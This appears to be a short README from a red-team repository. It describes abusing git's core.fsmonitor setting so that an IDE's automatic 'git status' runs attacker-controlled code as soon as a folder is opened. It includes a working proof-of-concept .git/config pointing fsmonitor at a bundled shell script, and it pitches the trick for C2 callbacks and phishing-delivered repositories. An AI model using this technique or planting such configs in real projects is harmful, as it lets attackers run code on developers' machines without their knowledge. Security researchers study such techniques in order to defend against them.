***This is a documented (known) issue, but I found this during my research & its pretty useful.***

**Summary:** The FSMonitor helper is executed by `git` on every command like `git status`, `git diff`, etc., hence `git` will blindly lauch whatever path we specfic there. Our IDEs runs `git status` automatically the moment you open a folder to populate its SCM (Source Control Management) panel; 

Which allows `git` to spawn the configured helper which executes attacker controlled code. This tradecraft can be used during RT or in a assume-breach scenario with any C2 or our [XRayC2](http://github.com/RootUp/XRayC2) to get a callback that evades traditional network defenses. (Ofcourse, phishing emails are required to trick end user, but opening a folder in IDE seems a fair operation).

For proof-of-work, `git clone` this repo add the below config under your `.git` directory. Once done open the crafted folder with any IDE, a calculator should pop. This POC is macOS specfic modify it according to your env.

```bash
cd git-fsmonitor
mkdir .git
nano .git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
	fsmonitor = ./icons/icons.sh
```
